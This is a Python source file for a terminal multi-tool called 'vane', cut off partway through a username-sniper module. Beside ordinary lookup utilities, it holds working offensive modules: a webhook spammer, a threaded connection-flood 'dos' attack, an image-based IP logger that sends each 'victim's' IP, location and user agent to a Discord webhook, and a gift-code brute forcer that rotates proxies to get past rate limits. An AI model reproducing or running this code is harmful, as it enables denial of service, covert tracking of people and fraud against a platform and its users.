import base64
import concurrent.futures
import datetime
import json
import os
import random
import secrets
import string
import subprocess
import threading
import time
import urllib.parse
from collections import deque
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Any, Dict, List, Optional  # noqa: UP035
from urllib import parse

import httpagentparser
import httpx
import hwid
import phonenumbers
import requests
from bs4 import BeautifulSoup
from phonenumbers import carrier, geocoder, timezone
from PIL import Image
from PIL.ExifTags import TAGS
from rich.console import Console

ip = requests.get("https://api.ipify.org?format=json")
data = ip.json()
cleanip = data["ip"]
now = datetime.datetime.now().hour  # noqa: DTZ005
now_full = datetime.datetime.now().strftime("%H:%M")  # noqa: DTZ005

version = "v1.0"

morning = "good morning! what would you like to do."
afternoon = "good afternoon! what would you like to do."
evening = "good evening! what would you like to do."

spacer = "      "


def start():
    from rich.align import Align
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text

    logo = r"""
        ,--.  ,--.,--,--.,--,--,  ,---.  
        \  `'  /' ,-.  ||      \| .-. : 
        \    / \ '-'  ||  ||  |\   --. 
        `--'   `--`--'`--''--' `----' 
    """
    console = Console(highlight=False)

    console.print(
        Panel(
            Align.center(
                Text(logo, style="medium_purple1")
            ),
            border_style="medium_purple1",
            padding=(0, 2),
        )
    )

    # Greeting
    if now < 12:
        greeting = morning
    elif now < 18:
        greeting = afternoon
    else:
        greeting = evening

    console.print(
        Align.center(
            Text(greeting, style="medium_purple1")
        )
    )

    info = Table.grid(padding=(0, 4))
    info.add_column(justify="left")
    info.add_column(justify="left")

    info.add_row(
        f"[dim]ip[/dim]       [medium_purple1]{cleanip}[/medium_purple1]",
        f"[dim]time[/dim]     [medium_purple1]{now_full}[/medium_purple1]",
        f"[dim]ver[/dim]     [medium_purple1]{version}[/medium_purple1]",
    )

    console.print(
        Panel(
            info,
            title="[bold medium_purple1]system[/bold medium_purple1]",
            border_style="medium_purple1",
            padding=(0, 2),
        )
    )

    modules = [
        ("01", "webhook spam"),
        ("02", "dos"),
        ("03", "ip lookup"),
        ("04", "dns lookup"),
        ("05", "who"),
        ("06", "ip to hostname"),
        ("07", "email records"),
        ("08", "ssl certs"),
        ("09", "username lookup"),
        ("10", "number lookup"),
        ("11", "discord image logger [dim](dev)[/dim]"),
        ("12", "temporary email"),
        ("13", "metadata tools"),
        ("14", "password generator"),
        ("15", "discord hypesquad changer [dim](broken)[/dim]"),
        ("16", "view hwid"),
        ("17", "base64 encode / decode"),
        ("18", "url inspector"),
        ("19", "port scanner"),
        ("20", "discord gift scanner"),
        ("21", "ip to integer"),
        ("22", "proxy search"),
        ("23", "discord 4l sniper [dim]ASS[/dim]")
    ]

    menu = Table(
        show_header=False,
        show_edge=False,
        show_lines=False,
        box=None,
        padding=(0, 2),
        expand=True,
    )

    menu.add_column(width=4, justify="right")
    menu.add_column()
    menu.add_column(width=4, justify="right")
    menu.add_column()

    half = (len(modules) + 1) // 2

    left_modules = modules[:half]
    right_modules = modules[half:]

    for i in range(half):
        left = left_modules[i]
        right = right_modules[i] if i < len(right_modules) else ("", "")

        menu.add_row(
            f"[bold medium_purple1]{left[0]}[/bold medium_purple1]",
            left[1],
            f"[bold medium_purple1]{right[0]}[/bold medium_purple1]",
            right[1],
        )

    console.print(
        Panel(
            menu,
            title="[bold medium_purple1]modules[/bold medium_purple1]",
            border_style="medium_purple1",
            padding=(1, 1),
        )
    )

    console.print(
        Align.center(
            "[dim]discord.gg/j5MKxynwbV[/dim]"
        )
    )

    choice = console.input(
        "\n[bold medium_purple1]vane[/bold medium_purple1] [dim]›[/dim] "
    ).strip()

    while not choice:
        choice = console.input(
            "[bold medium_purple1]vane[/bold medium_purple1] [dim]›[/dim] "
        ).strip()

    if choice == "1" or choice == "01":
        webhook_url = console.input(
            "[medium_purple1]webhook url: [/medium_purple1]"
        ).strip()
        webhook_text = console.input("[medium_purple1]text: [/medium_purple1]").strip()
        data = {"content": webhook_text}

        def webhookspam():
            num = 1
            while True:
                r = requests.post(webhook_url, json=data)
                console.print(f"{num}. {r.status_code}")
                num += 1

        webhookspam()

    elif choice == "2" or choice == "02":
        from concurrent.futures import ThreadPoolExecutor

        user_input = console.input("[medium_purple1]ip/url:  [/medium_purple1]").strip()

        parse_target = user_input
        if not parse_target.startswith(("http://", "https://")):
            parse_target = "http://" + parse_target

        try:
            parsed = urllib.parse.urlparse(parse_target)
            host = parsed.hostname
            port = parsed.port
            scheme = (
                urllib.parse.urlparse(user_input).scheme
                if user_input.startswith(("http://", "https://"))
                else "http"
            )

            if port is None:
                port = 443 if scheme == "https" else 80

            if not host:
                raise ValueError("could not parse a valid hostname or ip address.")

        except Exception as e:  # noqa: BLE001
            console.print(f"[red]invalid input format: {e}[/red]")
            port = None

        if port is not None:
            console.print(
                f"[yellow]testing connection to {host} on port {port}...[/yellow]"
            )

            stop_event = threading.Event()
            lock = threading.Lock()
            counter = 1
            # you can change this btw
            workers = 25

            def worker():
                import socket

                nonlocal counter
                while not stop_event.is_set():
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                            # sock.settimeout(0.001)
                            sock.connect((host, port))

                            with lock:
                                console.print(
                                    f"{counter}.  attacking {host}:{port}",
                                    style="medium_purple1",
                                )
                                counter += 1

                    except TimeoutError:
                        console.print("[red]connection timeout[/red]")
                        continue

                    except ConnectionRefusedError:
                        console.print(f"[red]connection refused on port {port}.[/red]")
                        stop_event.set()
                        break

                    except Exception as e:  # noqa: BLE001
                        console.print(f"network error: {e}", style="medium_purple1")
                        continue

            with ThreadPoolExecutor(max_workers=workers) as ex:
                futures = [ex.submit(worker) for _ in range(workers)]

    elif choice == "3" or choice == "03":
        ip = console.input("[medium_purple1]ip: [/medium_purple1]")

        def ip_lookup():
            try:
                with console.status("sending...", spinner="aesthetic"):
                    r = requests.get(f"http://ip-api.com/json/{ip}")
                console.print(r.json(), style="medium_purple1")
            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="medium_purple1")

        ip_lookup()
        input("\npress enter to exit...")

    elif choice == "4" or choice == "04":
        url = console.input("[medium_purple1]url: [/medium_purple1]")

        def dns_lookup():
            try:
                with console.status("sending...", spinner="aesthetic"):
                    r = requests.get(
                        "https://dns-lookup.com/api/dns",
                        params={"domain": f"{url}", "types": "A,MX,TXT"},
                    )
                console.print(r.json(), style="medium_purple1")
            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="medium_purple1")

        dns_lookup()
        input("\npress enter to exit...")

    elif choice == "5" or choice == "05":
        url = console.input("[medium_purple1]url: [/medium_purple1]")

        def whois():
            try:
                with console.status("sending...", spinner="aesthetic"):
                    r = requests.get(
                        "https://dns-lookup.com/api/whois", params={"domain": f"{url}"}
                    )
                data = r.json()
                data.pop("raw", None)
                console.print(data, style="medium_purple1")
            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="medium_purple1")

        whois()
        input("\npress enter to exit...")

    elif choice == "6" or choice == "06":
        dns = console.input("[medium_purple1]dns: [/medium_purple1]")

        def reversedns():
            try:
                with console.status("sending...", spinner="aesthetic"):
                    r = requests.get(
                        "https://dns-lookup.com/api/reverse-dns",
                        params={"ip": f"{dns}"},
                    )
                console.print(r.json(), style="medium_purple1")
            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="medium_purple1")

        reversedns()
        input("\npress enter to exit...")

    elif choice == "7" or choice == "07":
        domain = console.input("[medium_purple1]domain: [/medium_purple1]")

        def checkemail():
            try:
                with console.status("sending...", spinner="aesthetic"):
                    r = requests.get(
                        "https://dns-lookup.com/api/email",
                        params={"domain": f"{domain}"},
                    )
                console.print(r.json(), style="medium_purple1")
            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="medium_purple1")

        checkemail()
        input("\npress enter to exit...")

    elif choice == "8" or choice == "08":
        domain = console.input("[medium_purple1]domain: [/medium_purple1]")

        def sslcerts():
            try:
                with console.status("sending...", spinner="aesthetic"):
                    r = requests.get(
                        "https://dns-lookup.com/api/ssl", params={"domain": f"{domain}"}
                    )
                console.print(r.json(), style="medium_purple1")
            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="medium_purple1")

        sslcerts()
        input("\npress enter to exit...")

    elif choice == "9" or choice == "09":
        username = console.input("[medium_purple1]username: [/medium_purple1]")
        url = "https://raw.githubusercontent.com/WebBreacher/WhatsMyName/main/wmn-data.json"

        from concurrent.futures import ThreadPoolExecutor, as_completed

        def username_search():
            try:
                data = requests.get(url, timeout=10).json()
                sites = data["sites"]
                total = len(sites)
                results = []
                checked = 0

                def check(site):
                    url = site["uri_check"].replace("{account}", username)
                    try:
                        r = requests.get(
                            url, timeout=5, headers={"User-Agent": "Mozilla/5.0"}
                        )
                        found = (
                            site["e_string"] in r.text
                            and r.status_code == site["e_code"]
                        )
                    except requests.exceptions.RequestException:
                        return None
                    return {"site": site["name"], "url": url} if found else None

                with console.status(  # noqa: SIM117
                    f"checking sites... (0/{total})", spinner="aesthetic"
                ) as status:
                    with ThreadPoolExecutor(max_workers=20) as pool:
                        futures = {pool.submit(check, site): site for site in sites}
                        for future in as_completed(futures):
                            checked += 1
                            status.update(f"checking sites... ({checked}/{total})")
                            result = future.result()
                            if result:
                                results.append(result)

                console.print(results, style="medium_purple1")
            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="medium_purple1")

        username_search()
        input("\npress enter to exit...")

    elif choice == "10":
        number = console.input(
            "[medium_purple1]phone number: [/medium_purple1]"
        ).strip()
        if not number.startswith("+"):
            number = "+" + number

        def checknumber():
            try:
                parsed = phonenumbers.parse(number)
                LINE_TYPES = {
                    0: "fixed_line",
                    1: "mobile",
                    2: "fixed_line_or_mobile",
                    3: "toll_free",
                    4: "premium_rate",
                    5: "shared_cost",
                    6: "voip",
                    7: "personal_number",
                    8: "pager",
                    9: "uan",
                    10: "voicemail",
                    27: "unknown",
                }
                info = (
                    f"valid: {phonenumbers.is_valid_number(parsed)}\n"
                    f"carrier: {carrier.name_for_number(parsed, 'en')}\n"
                    f"region: {geocoder.description_for_number(parsed, 'en')}\n"
                    f"timezone: {', '.join(timezone.time_zones_for_number(parsed))}\n"
                    f"line_type: {LINE_TYPES.get(phonenumbers.number_type(parsed), 'unknown')}\n"
                    f"is_possible: {phonenumbers.is_possible_number(parsed)}\n"
                    f"national_number: {parsed.national_number}\n"
                    f"region_code: {phonenumbers.region_code_for_number(parsed)}\n"
                    f"e164: {phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)}\n"
                    f"national_format: {phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL)}\n"
                    f"international_format: {phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}"
                )
                console.print(info, style="medium_purple1")
            except phonenumbers.NumberParseException as e:
                console.print(f"parse failed: {e}", style="medium_purple1")

        checknumber()
        input("\npress enter to exit...")

    elif choice == "11":
        webhook = console.input(
            "[medium_purple1]webhook url: [/medium_purple1]"
        ).strip()

        console.print(
            "\nps: dont use a service like catbox.moe for your image. cannot be a gif",
            style="medium_purple1",
        )
        image_url = console.input("[medium_purple1]image url: [/medium_purple1]")

        console.print(
            "your subdomain will be what comes before '.localexpose.net' e.g tenor.localexpose.net",
            style="medium_purple1",
        )
        subdomain = console.input("[medium_purple1]subdomain: [/medium_purple1]")

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
            "Accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }

        bindata = httpx.get(image_url, headers=headers).content
        buggedimg = False
        buggedbin = base64.b85decode(
            b"|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000"
        )

        def format():
            def formatHook(
                ip, city, reg, country, loc, org, postal, useragent, os, browser
            ):
                return {
                    "username": "vane ip logger",
                    "content": " ",
                    "embeds": [
                        {
                            "title": "vane strikes again!",
                            "color": 000000,
                            "description": "a victim opened the original image. you can find their info below.",
                            "author": {"name": "vane"},
                            "fields": [
                                {
                                    "name": "ip info",
                                    "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
                                    "inline": True,
                                },
                                {
                                    "name": "advanced info",
                                    "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `look below!`\n```yaml\n{useragent}\n```",
                                    "inline": False,
                                },
                            ],
                        }
                    ],
                }

            def prev(ip, uag):
                return {
                    "username": "vane ip logger",
                    "content": "",
                    "embeds": [
                        {
                            "title": "vane alert!",
                            "color": 000000,
                            "description": f"discord previewed a vane image! You can expect an ip soon.\n\n**IP:** `{ip}`\n**UserAgent:** `look below!`\n```yaml\n{uag}```",
                            "author": {"name": "vane"},
                            "fields": [],
                        }
                    ],
                }

            class handler(BaseHTTPRequestHandler):
                def do_GET(self):
                    s = self.path
                    dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                    try:
                        data = (
                            httpx.get(dic["url"]).content if "url" in dic else bindata
                        )
                    except Exception:  # noqa: BLE001
                        data = bindata
                    useragent = (
                        self.headers.get("user-agent")
                        if "user-agent" in self.headers
                        else "no user agent found!"
                    )
                    os, browser = httpagentparser.simple_detect(useragent)
                    if self.headers.get("x-forwarded-for", "").startswith(
                        ("35", "34", "104.196")
                    ):
                        if "discord" in useragent.lower():
                            self.send_response(200)
                            self.send_header("Content-type", "image/jpeg")
                            self.end_headers()
                            self.wfile.write(buggedbin if buggedimg else bindata)
                            httpx.post(
                                webhook,
                                json=prev(
                                    self.headers.get("x-forwarded-for"), useragent
                                ),
                            )
                        else:
                            pass
                    else:
                        self.send_response(200)
                        self.send_header("Content-type", "image/jpeg")
                        self.end_headers()
                        self.wfile.write(data)
                        ipInfo = httpx.get(
                            "https://ipinfo.io/{}/json".format(
                                self.headers.get("x-forwarded-for")
                            )
                        ).json()
                        httpx.post(
                            webhook,
                            json=formatHook(
                                ipInfo["ip"],
                                ipInfo["city"],
                                ipInfo["region"],
                                ipInfo["country"],
                                ipInfo["loc"],
                                ipInfo["org"],
                                ipInfo["postal"],
                                useragent,
                                os,
                                browser,
                            ),
                        )
                    return  # noqa: PLR1711

            try:
                server = HTTPServer(("0.0.0.0", 9000), handler)
                console.print("image server running. ctrl + c to stop \n")
                tunnel = subprocess.Popen(
                    ["ssh", "-R", f"{subdomain}:3000:localhost:9000", "localexpose.net"]
                )
                server.serve_forever()
            except KeyboardInterrupt:
                tunnel.terminate()
                tunnel.kill()
                os._exit(1)

        format()

    elif choice == "12":

        def tempemail():
            try:
                addr = (
                    console.input("[medium_purple1]email name: [/medium_purple1]")
                    .strip()
                    .lower()
                )

                if "@" not in addr:
                    addr += "@catchmail.io"

                console.print(f"watching {addr}...", style="medium_purple1")

                seen = set()

                while True:
                    r = requests.get(
                        "https://api.catchmail.io/api/v1/mailbox",
                        params={"address": addr},
                        timeout=5,
                    )

                    r.raise_for_status()
                    data = r.json()

                    for email in data.get("messages", []):
                        if email["id"] in seen:
                            continue

                        seen.add(email["id"])

                        mail = requests.get(
                            f"https://api.catchmail.io/api/v1/message/{email['id']}",
                            params={"mailbox": addr},
                            timeout=5,
                        )

                        mail.raise_for_status()
                        full = mail.json()

                        console.print(
                            f"""
from: {email["from"]}
subject: {email["subject"]}
date: {email["date"]}
id: {email["id"]}

text:
{full["body"]["text"] or full["body"]["html"]}
                """,
                            style="medium_purple1",
                        )

                    time.sleep(1)

            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="red")

        tempemail()

    elif choice == "13":
        path = Path(
            console.input("[medium_purple1]path to image: [/medium_purple1]")
            .strip()
            .strip("'\"")
        )

        def exiftools():
            try:
                img = Image.open(path)
                exif = img.getexif()
                for tag_id, value in exif.items():
                    tag = TAGS.get(tag_id, tag_id)
                    console.print(f"{tag}: {value}", style="medium_purple1")

                clear_question = console.input(
                    "\n[medium_purple1]clear? (y or n) [/medium_purple1]"
                )

                img = Image.open(path)

                if clear_question.lower().startswith("y"):
                    clean = img.copy()

                    output = path.with_name(f"wiped_{path.name}")

                    console.print(f"[green]saving as {output}[/green]")

                    clean.save(output, exif=b"")
                else:
                    console.print("not clearing.", style="medium_purple1")
            except Exception as e:  # noqa: BLE001
                console.print(f"invalid path. {e}", style="medium_purple1")

        exiftools()
        input("\npress enter to exit...")

    elif choice == "14":

        def password_gen():
            try:
                length = int(input("\nlength (default 20): ") or 20)
            except ValueError:
                length = 20

            charset = (
                string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
            )

            for i in range(8):
                pwd = "".join(secrets.choice(charset) for _ in range(length))
                print(f"{i + 1:02}: {pwd}")

        password_gen()
        console.input("\n[medium_purple1]press enter to quit... [/medium_purple1]")

    elif choice == "15":

        def change_hypesquad_badge(token, badge_id):
            url = "https://discord.com/api/v9/hypesquad/online"
            headers = {
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            }
            data = {"house": badge_id}

            try:
                response = requests.post(url, headers=headers, json=data)
                response.raise_for_status()
                console.print(f"hypesquad badge changed to id {badge_id}")

            except requests.exceptions.HTTPError as err:
                console.print(f"error changing hypesquad badge: {err}")

            except Exception as e:  # noqa: BLE001
                console.print(f"error: {e}")

        if __name__ == "__main__":
            token = console.input("discord account token: ")
            badge_id = console.input(
                "hypesquad badge id (1: bravery, 2: brilliance, 3: balance): "
            )

            while badge_id not in ["1", "2", "3"]:
                console.print("invalid hypesquad badge id. enter 1, 2, or 3.")
                console.input(
                    "\n[medium_purple1]press enter to quit... [/medium_purple1]"
                )
            else:  # noqa: PLW0120
                change_hypesquad_badge(token, badge_id)
                console.input(
                    "\n[medium_purple1]press enter to quit... [/medium_purple1]"
                )

    elif choice == "16":

        def showhwid():
            console.print(f"hwid: {hwid.get_hwid()}")

        showhwid()
        console.input("\n[medium_purple1]press enter to quit... [/medium_purple1]")

    elif choice == "17":
        ch = console.input(
            "[medium_purple1]1 - encode    2 - decode? [/medium_purple1]"
        )

        if ch == "1":
            text = console.input("text: ")
            enc_text = base64.b64encode(text.encode("utf-8")).decode("utf-8")
            console.print(f"encoded text:\n{enc_text}", style="medium_purple1")
            console.input("\n[medium_purple1]press enter to quit... [/medium_purple1]")

        elif ch == "2":
            enc_text = console.input("text (base64): ")
            dec_text = base64.b64decode(enc_text.encode("utf-8")).decode("utf-8")
            console.print(f"decoded text:\n{dec_text}", style="medium_purple1")
            console.input("\n[medium_purple1]press enter to quit... [/medium_purple1]")

    elif choice == "18":
        from urllib.parse import urlparse

        url = console.input("[medium_purple1]url: [/medium_purple1]").strip()

        if not url.startswith(("http://", "https://")):
            url = "https://" + url

        try:
            parsed = urlparse(url)

            if not parsed.netloc:
                console.print("[red]invalid url[/red]")
                return

            with console.status("[medium_purple1]inspecting url...[/medium_purple1]"):
                response = httpx.get(
                    url,
                    follow_redirects=True,
                    timeout=10,
                    headers={"User-Agent": "vane/1.0"},
                )

            console.print(
                "\n[bold medium_purple1]url inspector[/bold medium_purple1]\n"
            )

            console.print(f"[medium_purple1]url:[/medium_purple1]          {url}")
            console.print(
                f"[medium_purple1]final url:[/medium_purple1]   {response.url}"
            )
            console.print(
                f"[medium_purple1]status:[/medium_purple1]       "
                f"{response.status_code} {response.reason_phrase}"
            )
            console.print(
                f"[medium_purple1]https:[/medium_purple1]        "
                f"{'Yes' if response.url.scheme == 'https' else 'No'}"
            )
            console.print(
                f"[medium_purple1]content-type:[/medium_purple1] "
                f"{response.headers.get('content-type', 'Unknown')}"
            )
            console.print(
                f"[medium_purple1]server:[/medium_purple1]       "
                f"{response.headers.get('server', 'Unknown')}"
            )

            content_length = response.headers.get("content-length")

            if content_length:
                console.print(
                    f"[medium_purple1]size:[/medium_purple1]         {content_length} bytes"
                )
            else:
                console.print(
                    f"[medium_purple1]size:[/medium_purple1]         {len(response.content)} bytes"
                )

            console.print(
                f"[medium_purple1]redirects:[/medium_purple1]    {len(response.history)}"
            )

            console.print(
                "\n[bold medium_purple1]security headers[/bold medium_purple1]"
            )

            security_headers = {
                "strict-transport-security": "HSTS",
                "content-security-policy": "CSP",
                "x-frame-options": "X-Frame-Options",
                "x-content-type-options": "X-Content-Type-Options",
            }

            for header, name in security_headers.items():
                if header in response.headers:
                    console.print(f"[green][+] {name}[/green]")
                else:
                    console.print(f"[yellow][-] {name}[/yellow]")
            console.input("\n[medium_purple1]press enter to quit... [/medium_purple1]")

        except httpx.RequestError as e:
            console.print(f"[red]request failed: {e}[/red]")

        except Exception as e:  # noqa: BLE001
            console.print(f"[red]error: {e}[/red]")

    elif choice == "19":
        import socket
        from concurrent.futures import ThreadPoolExecutor, as_completed
        from urllib.parse import urlparse

        from rich.progress import Progress

        host = (
            console.input("[medium_purple1]host: [/medium_purple1]")
            .strip()
            .split(":")[0]
        )
        proto = (
            console.input("[medium_purple1]protocol (tcp/udp): [/medium_purple1]")
            .strip()
            .lower()
        )

        if host.startswith(("http://", "https://")):
            host = urlparse(host).hostname

        if not host:
            console.print("[red]invalid host[/red]")
            console.input("\n[medium_purple1]press enter to quit... [/medium_purple1]")
        elif proto not in ("tcp", "udp"):
            console.print("[red]invalid protocol[/red]")
            console.input("\n[medium_purple1]press enter to quit... [/medium_purple1]")
        else:
            start = 1
            end = 1024
            max_workers = 50

            console.print(
                f"\n[medium_purple1]scanning {host} ({start}-{end}) [{proto}]...[/medium_purple1]\n"
            )

            def scan_tcp(port):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)

                try:
                    result = sock.connect_ex((host, port))

                    if result == 0:
                        try:
                            service = socket.getservbyport(port, "tcp")
                        except OSError:
                            service = "unknown"

                        return port, service, "open"

                except OSError:
                    return None

                finally:
                    sock.close()

                return None

            def scan_udp(port):
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.9)

                try:
                    sock.connect((host, port))
                    sock.send(b"")

                    try:
                        sock.recv(1024)
                        state = "open"
                    except socket.timeout:  # noqa: UP041
                        state = "open|filtered"
                    except (ConnectionRefusedError, ConnectionResetError):
                        return None

                    try:
                        service = socket.getservbyport(port, "udp")
                    except OSError:
                        service = "unknown"

                    return port, service, state

                except OSError:
                    return None

                finally:
                    sock.close()

            scan_fn = scan_tcp if proto == "tcp" else scan_udp
            open_ports = []

            try:
                with Progress() as progress:
                    task = progress.add_task(
                        "[medium_purple1]scanning ports...", total=end - start + 1
                    )

                    with ThreadPoolExecutor(max_workers=max_workers) as executor:
                        futures = [
                            executor.submit(scan_fn, port)
                            for port in range(start, end + 1)
                        ]

                        for future in as_completed(futures):
                            result = future.result()

                            if result:
                                port, service, state = result
                                open_ports.append((port, service, state))

                                console.print(
                                    f"[green][+] {port:<5} {state}[/green] "
                                    f"[dim]({service})[/dim]"
                                )

                            progress.advance(task)

                open_ports.sort()

                console.print(
                    f"\n[medium_purple1]scanned {end - start + 1} ports | "
                    f"{len(open_ports)} open[/medium_purple1]"
                )

            except OSError as e:
                console.print(f"[red]scanner error: {e}[/red]")

            console.input("\n[medium_purple1]press enter to quit... [/medium_purple1]")

    elif choice == "20":
        proxy_choice = console.input(
            "[medium_purple1]use proxys (y / n): [/medium_purple1]"
        )
        console.print(
            'reminder: available codes save to a file called "links.txt", \nso you can leave this running for however long',
            style="red",
        )
        from concurrent.futures import ThreadPoolExecutor

        if proxy_choice == "y":
            url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&protocol=http&anonymity=elite%2Canonymous%2Ctransparent&timeout=90"
            r = requests.get(url, timeout=15)
            proxies = r.text.strip().splitlines()

            def check(p):
                try:
                    r = requests.get(
                        "https://api.ipify.org",
                        proxies={"http": f"http://{p}", "https": f"http://{p}"},
                        timeout=1,
                    )
                    return p if r.status_code == 200 else None
                except Exception:  # noqa: BLE001
                    return None

            def get_working_proxies(proxies, workers=50):
                console.print("checking working proxys...", style="blue")
                with ThreadPoolExecutor(max_workers=workers) as ex:
                    results = ex.map(check, proxies)
                return [p for p in results if p]

            working = get_working_proxies(proxies)

            def random_proxy():
                p = random.choice(working)
                return {"http": f"http://{p}", "https": f"http://{p}"}

        baseurl = "https://discord.com/api/v9/entitlements/gift-codes/"
        chars = string.ascii_letters + string.digits
        lent = 16
        num_threads = 8

        stop_event = threading.Event()
        print_lock = threading.Lock()

        def worker():
            while not stop_event.is_set():
                combo = "".join(random.choices(chars, k=lent))
                url = baseurl + combo
                try:
                    if proxy_choice == "y":
                        resp = requests.get(
                            url,
                            timeout=5,
                            params={
                                "with_application": "true",
                                "with_subscription_plan": "false",
                            },
                            proxies=random_proxy(),
                        )
                    else:
                        resp = requests.get(
                            url,
                            timeout=5,
                            params={
                                "with_application": "true",
                                "with_subscription_plan": "false",
                            },
                        )

                    if resp.status_code == 404:
                        status = "[red]unavailable[/red]"
                    elif resp.status_code == 429:
                        status = "[yellow]rate limited[/yellow]"
                    else:
                        status = "[green]found[/green]"
                        with open("links.txt", "a") as f:
                            f.write(f"{url}\n")
                        console.print("saved!", style="green")
                except requests.RequestException as e:
                    status = f"error: {e}"

                with print_lock:
                    console.print(f"{url} -> {status}")

        def main():
            threads = [
                threading.Thread(target=worker, daemon=True) for _ in range(num_threads)
            ]
            for t in threads:
                t.start()

            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                stop_event.set()
                print("stopped")

        main()

    elif choice == "21":

        def swag(ip: str) -> int:
            parts = ip.strip().split(".")
            if len(parts) != 4:
                raise ValueError("invalid ipv4 address: must have 4 octets")
            total = 0
            for i, p in enumerate(parts):
                if not p.isdigit():
                    raise ValueError(f"octet {i + 1} is not a number")
                n = int(p)
                if not (0 <= n <= 255):
                    raise ValueError(f"octet {i + 1} out of range (0-255)")
                total = (total << 8) | n
            if (total >> 24) == 0:
                raise ValueError("first octet cannot be 0")
            return total
        console.input("press enter to exit...")

        try:
            print(f"[green]{swag(cleanip)}[/green]")
        except ValueError as e:
            print(f"Error: {e}")

    elif choice == "22":
        from urllib.parse import parse_qs, unquote, urlparse
        query = console.input("[green]search query: ").strip()
        while not query:
            console.print("[red]no query entered")
            query = console.input("[green]search query: ").strip()

        proxy_list = []
        try:
            resp = requests.get(
                "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&proxy_format=ipport&format=text&protocol=http",
                timeout=10,
            )
            proxy_list = [p.strip() for p in resp.text.splitlines() if p.strip()]
        except requests.RequestException as e:
            console.print(f"[red]failed to fetch proxy list: {e}")

        if not proxy_list:
            console.print("[red]no proxies returned")
        else:
            random.shuffle(proxy_list)
            headers = {"User-Agent": "Mozilla/5.0"}
            results = None

            with console.status("[cyan]trying proxies...", spinner="aesthetic"):
                for proxy in proxy_list:
                    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                    try:
                        console.print(f"tried proxy: {proxy}", style="cyan")
                        r = requests.get(
                            "https://html.duckduckgo.com/html/",
                            params={"q": query},
                            proxies=proxies,
                            headers=headers,
                            timeout=6,
                        )
                        if r.status_code == 200:
                            results = r.text
                            console.print(f"[green]used proxy:[/green] [cyan]{proxy}")
                            break
                    except requests.RequestException:
                        pass

            if not results:
                console.print("[red]all proxies failed")
            else:
                soup = BeautifulSoup(results, "html.parser")
                links = soup.select("a.result__a")

                if not links:
                    console.print("[yellow]no results parsed")
                else:
                    for i, a in enumerate(links[:10], 1):
                        href = a.get("href", "")
                        parsed = parse_qs(urlparse(href).query)
                        real_url = unquote(parsed.get("uddg", [href])[0])
                        console.print(f"[cyan]{i}.[/cyan] [white]{a.get_text(strip=True)}")
                        console.print(f"   [dim]{real_url}")
        console.input("press enter to exit...")

    elif choice == "23":
        console = Console()
        config_path = Path("config.json")
        PROXY_SOURCES = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://www.proxyscan.io/download?type=http",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
        ]

        def load_sniper_config() -> Dict[str, Any]:
            if not config_path.exists():
                return {}
            try:
                with config_path.open() as f:
                    data = json.load(f)
            except (json.JSONDecodeError, OSError) as e:
                console.print(f"[yellow]could not load config.json: {e}[/yellow]")
                return {}
            if not isinstance(data, dict):
                console.print("[yellow]config.json must contain a json object. using prompts.[/yellow]")
                return {}
            return data

        def save_sniper_config(config: Dict[str, Any]) -> None:
            try:
                with config_path.open("w") as f:
                    json.dump(config, f, indent=4)
            except OSError as e:
                console.print(f"[red]failed to save config.json: {e}[/red]")

        def parse_bool(value) -> bool:
            if isinstance(value, bool):
                return value
            if isinstance(value, str):
                return value.strip().lower() in ("y", "yes", "true", "1", "on")
            return bool(value)

        def ask_bool(prompt: str) -> bool:
            return parse_bool(input(prompt))

        def fetch_proxies(sources=PROXY_SOURCES, timeout=6) -> List[str]:
            proxies = set()
            headers = {"User-Agent": "Mozilla/5.0"}
            for url in sources:
                try:
                    r = requests.get(url, headers=headers, timeout=timeout)
